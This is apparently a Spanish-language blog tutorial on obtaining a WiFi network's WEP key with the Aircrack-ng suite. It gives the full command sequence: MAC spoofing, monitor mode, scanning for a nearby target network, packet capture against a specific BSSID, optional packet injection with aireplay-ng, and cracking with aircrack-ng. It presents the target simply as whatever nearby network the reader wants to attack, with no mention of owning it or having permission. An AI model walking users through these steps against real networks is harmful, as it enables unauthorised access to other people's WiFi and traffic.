---
layout: post
title: "Obtener clave WEP WIFI con Aircrack"
description: "Como descifrar claves WEP WIFI con la suite Aircrack"
locale: es
---

El primer paso es <a href="http://www.aircrack-ng.org/doku.php?id=downloads&DokuWiki=d66620079141170d5df90612b298008d">descargar</a> e instalar la suite Aircrack-ng.

Para descifrar la clave WEP de una red wifi debemos seguir una serie de pasos:

Cambiamos la dirección hardware (MAC) de nuestro equipo:

{% highlight bash %}
# ifconfig wlan0 down
# ifconfig wlan0 hw ether 00:11:22:33:44:55
{% endhighlight %}

Comenzamos monitorización de paquetes en la interfaz wifi, para ello utilizamos la herramienta airmon-ng:


    # airmon-ng start wlan0

Descubrimos todas las redes wifi, de los datos que saldrán debemos fijarnos en la red que queremos atacar, probablemente aquella que tenga una mejor señal:


    # airodump-ng wlan0

Cuando ejecutemos el comando anterior, aparecerá una pantalla parecida a la siguiente:
<img src="/uploads/images/full/bbdd5069a2c63a3aabf9b2ad26df7d528c53c542.png" alt="" />
Este paso solo sirve para averiguar todo lo que necesitamos saber para atacar la red que nos interesa (normalmente la más cercana, la que tiene un menor potencia, columna PWR). Solo nos fijaremos en los campos que hemos marcado como azulados, el **BSSID** (dirección MAC del punto de acceso atacado), el **PWR** (poder de la señal a menor valor mejor), el CH (canal), **ENC** y **CIPHER** (el tipo de seguridad, WEP para este tutorial)  y el **ESSID** (nombre del punto de acceso).

Una vez obtenidos los datos, podemos empezar a capturar paquetes de la red que nos interese atacar, en nuestro caso hemos seleccionado "WLAN_DF", cuyo canal es el **2** y cuyo **BSSID** es 00:23:F8:A0:C4:A2:


    # airodump-ng -c 2 -w paquetes --bssid 00:23:F8:A0:C4:A2 wlan0

En este punto solo queda esperar a recolectar de unos 20000 a 40000 paquetes, dependerá del uso de la red.
### Opcional, inyección de paquetes
Solo si nuestro driver para la tarjeta de red admite inyección de paquetes, podemos aumentar de forma considerable la velocidad de recolección de paquetes utilizando la herramienta aireplay-ng de la suite de Aircrack, alguno de los métodos son los siguientes:
{% highlight bash %}
# aireplay-ng -1 0 -a 00:23:F8:A0:C4:A2 -h 00:11:22:33:44:55 -e WLAN_DF wlan0
# aireplay-ng -3 -b 00:23:F8:A0:C4:A2 -h 00:11:22:33:44:55 wlan0
{% endhighlight %}

### Obtener la clave de red
Una vez obtenidos paquetes suficientes (de 20000 a 40000 normalmente) utilizaremos aircrack-ng para descifrar la contraseña.


     # aircrack-ng paquetes-01.cap
